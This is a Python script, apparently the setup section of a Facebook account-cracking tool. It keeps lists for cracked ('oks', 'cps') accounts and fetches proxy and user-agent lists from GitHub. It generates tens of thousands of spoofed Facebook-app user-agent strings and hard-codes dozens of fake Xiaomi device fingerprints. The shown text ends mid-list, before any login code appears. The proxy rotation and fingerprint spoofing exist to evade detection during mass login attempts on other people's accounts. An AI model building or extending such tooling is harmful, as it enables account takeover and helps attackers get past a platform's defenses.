#───────────────[ IMPORT SYSTEM ]────────────────#
import os
import subprocess
import sys
required_packages = [
    'requests',
    'httpx',
    'beautifulsoup4',
    'rich',
    'urllib3'
]
def install_packages():
    for package in required_packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
try:
    import base64
    import datetime
    import json
    import math
    import platform
    import random
    import re
    import bs4
    import string
    import time
    import uuid
    import zlib
    import urllib3
    import requests
    import httpx
    from os import path
    from urllib.request import urlopen
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from concurrent.futures import ThreadPoolExecutor as tred
    from concurrent.futures import ThreadPoolExecutor as Tred
    from rich.table import Table as me
    from rich.console import Console as sol
    from rich.console import Group as gp
    from rich.panel import Panel as nel
    from rich.markdown import Markdown as mark
    from rich.columns import Columns as col
    from rich import pretty
    from rich.text import Text as tekz
    from time import localtime as lt
    from bs4 import BeautifulSoup as sop
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    install_packages()
    import base64
    import datetime
    import json
    import math
    import platform
    import random
    import re
    import string
    import time
    import uuid
    import zlib
    import urllib3
    import requests
    import httpx
    from os import path
    from urllib.request import urlopen
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from rich.table import Table as me
    from rich.console import Console as sol
    from rich.console import Group as gp
    from rich.panel import Panel as nel
    from rich.markdown import Markdown as mark
    from rich.columns import Columns as col
    from rich import pretty
    from rich.text import Text as tekz
    from time import localtime as lt
    from bs4 import BeautifulSoup as sop
#__________________| IMPORT  END |__________________#

try:
    os.system('clear')
except:
    pass

pretty.install()

def clear():
    os.system('clear')
#__________________| ETC |__________________#

#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';M1 = '\033[1;31m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| UA DEF |__________________#
filename = '.uamax.txt'
if os.path.exists(filename):
    pass
else:
    try:
        sos = requests.get('https://raw.githubusercontent.com/Pro-Max-420/ua/main/bbnew.txt').text
        with open(filename, 'w') as f:
            f.write(sos)
    except Exception as e:
        print("NO INTERNET CONNECTION.....!!😣")
uadef = open(filename, 'r').read().splitlines()
#───────────────[ PROX ]─────────────────────────#
os.system('rm -rf .prox.txt')
try:
    prox = requests.get('https://raw.githubusercontent.com/SHAJON-404/Live-Proxy/main/prox.txt').text
    with open('.prox.txt', 'w') as f:
        f.write(prox)
except Exception as e:
    print("NO INTERNET CONNECTION.....!!😣")
proxy = open('.prox.txt', 'r').read().splitlines()
#───────────────[ USER AGENT ]─────────────────────────#
ugen2=[]
ugen=[]
ugen2 = []
ugen = []
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a = "Mozilla/5.0 (iPhone; CPU iPhone OS "
    b = "15_2_"+str(random.randint(0, 9))
    c = " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBIOS;FBAV/"
    d = str(random.randint(355, 370))
    e = ".0.0."
    f = str(random.randint(28,34))
    g = ".119;FBBV/"
    h = str(random.randint(270968982, 273914825))
    i = f";FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/{b};FBSS/2;FBID/phone;FBLC/"
    j = str(random.choice(["es_ES;FBOP/5;FBRV/","it_IT;FBOP/5;FBRV/"]))
    k = str(random.randint(274911763, 277913874))
    l = "]"
    ua = a+b+c+d+e+f+g+h+i+j+k+l
    ugen.append(ua)
for xd in range(10000):
    a = "FBAN/FB4A;FBAV/"
    b = str(random.randint(400, 426))
    c = ".0.0."
    d = str(random.randint(19, 24))
    e = ".105;FBBV/"
    f = str(random.randint(316828437, 321890423))
    ua = [
        'FBLC/en_US',
        'FBLC/en_GB',
        'FBLC/es_ES',
        'FBLC/fr_FR',
        'FBLC/de_DE',
        'FBLC/it_IT',
        'FBLC/pt_PT',
        'FBLC/ru_RU',
        'FBLC/ar_AR',
        'FBLC/zh_CN',
        'FBLC/zh_TW',
        'FBLC/ja_JP',
        'FBLC/ko_KR',
        'FBLC/vi_VN',
        'FBLC/id_ID',
        'FBLC/th_TH',
        'FBLC/ms_MY',
        'FBLC/tr_TR',
        'FBLC/pl_PL',
        'FBLC/nl_NL',
        'FBLC/sv_SE',
        'FBLC/da_DK',
        'FBLC/no_NO',
        'FBLC/fi_FI',
        'FBLC/cs_CZ',
        'FBLC/sk_SK',
        'FBLC/hu_HU',
        'FBLC/ro_RO',
        'FBLC/bg_BG',
        'FBLC/sr_RS',
        'FBLC/hr_HR',
        'FBLC/lt_LT',
        'FBLC/lv_LV',
        'FBLC/et_EE',
        'FBLC/sl_SI',
        'FBLC/mk_MK',
        'FBLC/sq_AL',
        'FBLC/iw_IL',
        'FBLC/hi_IN',
        'FBLC/bn_BD',
        'FBLC/ne_NP',
        'FBLC/ta_IN',
        'FBLC/ml_IN',
        'FBLC/gu_IN',
        'FBLC/pa_IN',
        'FBLC/or_IN',
        'FBLC/as_IN',
        'FBLC/mr_IN',
        'FBLC/sa_IN'
    ]
    g = f";FBDM/density=2.2,width=1080,height=2280;{random.choice(ua)};FBRV/"
    h = str(random.randint(193651229, 198551215))
    i = ";FBCR/Nokia;FBMF/Nokia;FBBD/Nokia 7.2;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/"
    j = str(random.randint(10, 12))
    k = ";FBOP/1;FBCA/arm64-v8a:"
    ua = a + b + c + d + e + f + g + h + i + j + k
    ugen2.append(ua)
    
user_agents = [
    "FBAN/FB4A;FBAV/299.0.0.3.129;FBBV/357347878;FBDM/{density=2.3,width=1080,height=1450};FBLC/en_PK;FBRV/818018892;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/373.0.0.9.109;FBBV/265912334;FBDM/{density=2.5,width=1080,height=1487};FBLC/en_IN;FBRV/803072318;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/308.0.0.6.107;FBBV/620908883;FBDM/{density=3.2,width=1080,height=1460};FBLC/en_GB;FBRV/266547772;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/385.0.0.2.134;FBBV/956700298;FBDM/{density=2.2,width=1080,height=1400};FBLC/id_ID;FBRV/443070692;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/199.0.0.4.180;FBBV/211914393;FBDM/{density=3.4,width=1080,height=1427};FBLC/he_IL;FBRV/536565958;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/334.0.0.3.162;FBBV/144139270;FBDM/{density=2.2,width=1080,height=1452};FBLC/ru_RU;FBRV/880588327;FBCR/Telenor;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/240.0.0.2.177;FBBV/541574211;FBDM/{density=2.5,width=1080,height=1462};FBLC/lt_LT;FBRV/811778111;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/223.0.0.4.140;FBBV/307624648;FBDM/{density=2.4,width=1080,height=1478};FBLC/pt_PT;FBRV/438278744;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/306.0.0.7.125;FBBV/748756468;FBDM/{density=3.5,width=1080,height=1471};FBLC/hi_IN;FBRV/311036015;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/395.0.0.2.172;FBBV/295663884;FBDM/{density=3.2,width=1080,height=1482};FBLC/cs_CZ;FBRV/627255972;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/226.0.0.3.119;FBBV/531614041;FBDM/{density=3.5,width=1080,height=1485};FBLC/ it_IT;FBRV/520764861;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/370.0.0.9.152;FBBV/185250136;FBDM/{density=3.2,width=1080,height=1432};FBLC/pt_PT;FBRV/858127514;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/396.0.0.5.146;FBBV/295499772;FBDM/{density=2.5,width=1080,height=1424};FBLC/pt_PT;FBRV/634012864;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7BG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/275.0.0.9.164;FBBV/976583862;FBDM/{density=2.3,width=1080,height=1493};FBLC/en_PK;FBRV/796684500;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/225.0.0.2.105;FBBV/247817190;FBDM/{density=3.5,width=1080,height=1447};FBLC/lt_LT;FBRV/160534098;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/358.0.0.7.181;FBBV/414767030;FBDM/{density=2.4,width=1080,height=1479};FBLC/en_IN;FBRV/314435272;FBCR/AT&T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/394.0.0.2.125;FBBV/368173092;FBDM/{density=2.4,width=1080,height=1439};FBLC/en_IN;FBRV/270096522;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/365.0.0.2.119;FBBV/764971298;FBDM/{density=3.5,width=1080,height=1482};FBLC/lt_LT;FBRV/726378281;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/217.0.0.8.197;FBBV/534711214;FBDM/{density=2.5,width=1080,height=1400};FBLC/hi_IN;FBRV/158506936;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/272.0.0.3.144;FBBV/771751771;FBDM/{density=3.2,width=1080,height=1483};FBLC/hi_IN;FBRV/988381215;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2011K2C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/284.0.0.7.99;FBBV/878600274;FBDM/{density=3.2,width=1080,height=1478};FBLC/he_IL;FBRV/281463046;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/383.0.0.7.107;FBBV/382684604;FBDM/{density=2.5,width=1080,height=1482};FBLC/cs_CZ;FBRV/251588674;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/213.0.0.1.113;FBBV/392032341;FBDM/{density=2.2,width=1080,height=1491};FBLC/pl_PL;FBRV/380478346;FBCR/Ufone;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/226.0.0.2.199;FBBV/457912479;FBDM/{density=3.5,width=1080,height=1452};FBLC/pt_PT;FBRV/592020928;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/276.0.0.4.179;FBBV/909546775;FBDM/{density=3.4,width=1080,height=1486};FBLC/en_US;FBRV/252456437;FBCR/MtelBG;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/275.0.0.5.119;FBBV/597243518;FBDM/{density=3.2,width=1080,height=1499};FBLC/cs_CZ;FBRV/689290214;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/329.0.0.3.179;FBBV/258639995;FBDM/{density=3.2,width=1080,height=1445};FBLC/pl_PL;FBRV/809874333;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/383.0.0.4.188;FBBV/511353711;FBDM/{density=3.4,width=1080,height=1454};FBLC/hi_IN;FBRV/585991379;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/218.0.0.5.128;FBBV/770446766;FBDM/{density=3.3,width=1080,height=1484};FBLC/pl_PL;FBRV/893692784;FBCR/Sprint;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/320.0.0.3.168;FBBV/532922268;FBDM/{density=3.5,width=1080,height=1438};FBLC/en_IN;FBRV/595359852;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/355.0.0.5.187;FBBV/446269940;FBDM/{density=2.2,width=1080,height=1431};FBLC/he_IL;FBRV/210241262;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/369.0.0.5.140;FBBV/893327877;FBDM/{density=2.4,width=1080,height=1469};FBLC/ru_RU;FBRV/244901542;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/336.0.0.5.104;FBBV/250735543;FBDM/{density=2.2,width=1080,height=1458};FBLC/en_PK;FBRV/171911536;FBCR/EE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/303.0.0.7.139;FBBV/412975790;FBDM/{density=3.3,width=1080,height=1452};FBLC/pl_PL;FBRV/384027758;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/279.0.0.1.186;FBBV/657738346;FBDM/{density=2.5,width=1080,height=1402};FBLC/ru_RU;FBRV/511137842;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/335.0.0.6.144;FBBV/681735580;FBDM/{density=2.5,width=1080,height=1448};FBLC/en_US;FBRV/392818967;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/257.0.0.2.153;FBBV/233997248;FBDM/{density=2.4,width=1080,height=1437};FBLC/ it_IT;FBRV/641198188;FBCR/Telenor;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/326.0.0.3.108;FBBV/552682731;FBDM/{density=2.3,width=1080,height=1427};FBLC/en_PK;FBRV/219307270;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/201.0.0.5.140;FBBV/981666434;FBDM/{density=3.4,width=1080,height=1413};FBLC/id_ID;FBRV/647016848;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/277.0.0.5.194;FBBV/433854615;FBDM/{density=3.4,width=1080,height=1438};FBLC/en_PK;FBRV/193846835;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/240.0.0.7.102;FBBV/782143219;FBDM/{density=3.5,width=1080,height=1477};FBLC/pl_PL;FBRV/119055042;FBCR/Jazz;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/245.0.0.8.172;FBBV/568382085;FBDM/{density=3.3,width=1080,height=1487};FBLC/hi_IN;FBRV/437691693;FBCR/Azercell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/315.0.0.8.130;FBBV/766666282;FBDM/{density=3.5,width=1080,height=1490};FBLC/pt_PT;FBRV/710026726;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/297.0.0.7.122;FBBV/911558815;FBDM/{density=3.2,width=1080,height=1483};FBLC/nl_NL;FBRV/126095501;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/243.0.0.3.171;FBBV/236953208;FBDM/{density=2.5,width=1080,height=1422};FBLC/cs_CZ;FBRV/813940200;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/264.0.0.5.180;FBBV/703966218;FBDM/{density=3.5,width=1080,height=1465};FBLC/en_US;FBRV/535850360;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/252.0.0.1.115;FBBV/389447344;FBDM/{density=3.4,width=1080,height=1415};FBLC/id_ID;FBRV/339605198;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/332.0.0.9.112;FBBV/648215416;FBDM/{density=2.3,width=1080,height=1428};FBLC/pt_PT;FBRV/710941263;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/230.0.0.8.125;FBBV/492515266;FBDM/{density=3.5,width=1080,height=1492};FBLC/en_PK;FBRV/245580383;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/241.0.0.2.115;FBBV/801902013;FBDM/{density=2.2,width=1080,height=1402};FBLC/en_US;FBRV/882778564;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/244.0.0.5.197;FBBV/522969084;FBDM/{density=3.5,width=1080,height=1429};FBLC/hi_IN;FBRV/243554403;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/385.0.0.1.183;FBBV/211103465;FBDM/{density=3.5,width=1080,height=1409};FBLC/lt_LT;FBRV/683946517;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/239.0.0.6.175;FBBV/290479068;FBDM/{density=3.2,width=1080,height=1461};FBLC/cs_CZ;FBRV/980822477;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/218.0.0.2.197;FBBV/448935857;FBDM/{density=2.2,width=1080,height=1420};FBLC/ it_IT;FBRV/937813546;FBCR/EE;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/365.0.0.8.188;FBBV/393909466;FBDM/{density=3.4,width=1080,height=1462};FBLC/hi_IN;FBRV/570588972;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/341.0.0.9.167;FBBV/233733593;FBDM/{density=2.5,width=1080,height=1452};FBLC/hi_IN;FBRV/600028878;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/383.0.0.7.198;FBBV/823403889;FBDM/{density=2.2,width=1080,height=1423};FBLC/hi_IN;FBRV/397221522;FBCR/EE;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/341.0.0.8.134;FBBV/389331008;FBDM/{density=3.2,width=1080,height=1470};FBLC/pl_PL;FBRV/281734388;FBCR/Azercell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/252.0.0.6.189;FBBV/514582261;FBDM/{density=2.2,width=1080,height=1486};FBLC/lt_LT;FBRV/784993649;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/368.0.0.5.124;FBBV/138801054;FBDM/{density=3.4,width=1080,height=1467};FBLC/id_ID;FBRV/435979161;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/238.0.0.2.146;FBBV/617295195;FBDM/{density=3.2,width=1080,height=1444};FBLC/en_US;FBRV/544447179;FBCR/EE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/265.0.0.8.189;FBBV/538975998;FBDM/{density=2.4,width=1080,height=1496};FBLC/lt_LT;FBRV/353455468;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/222.0.0.7.111;FBBV/479122100;FBDM/{density=2.4,width=1080,height=1416};FBLC/nl_NL;FBRV/653165695;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/387.0.0.2.107;FBBV/506317793;FBDM/{density=3.3,width=1080,height=1498};FBLC/id_ID;FBRV/408524486;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/216.0.0.8.145;FBBV/681139498;FBDM/{density=2.3,width=1080,height=1496};FBLC/id_ID;FBRV/207506940;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/282.0.0.3.187;FBBV/845367242;FBDM/{density=2.4,width=1080,height=1488};FBLC/pt_PT;FBRV/993104058;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/206.0.0.7.158;FBBV/549392695;FBDM/{density=3.5,width=1080,height=1411};FBLC/ it_IT;FBRV/510725267;FBCR/Tele2You;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/395.0.0.9.185;FBBV/333064569;FBDM/{density=2.2,width=1080,height=1421};FBLC/id_ID;FBRV/248172060;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/248.0.0.4.173;FBBV/853027753;FBDM/{density=2.2,width=1080,height=1457};FBLC/nl_NL;FBRV/205926323;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/236.0.0.1.157;FBBV/973131259;FBDM/{density=3.4,width=1080,height=1442};FBLC/es_ES;FBRV/438327240;FBCR/Tele2You;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
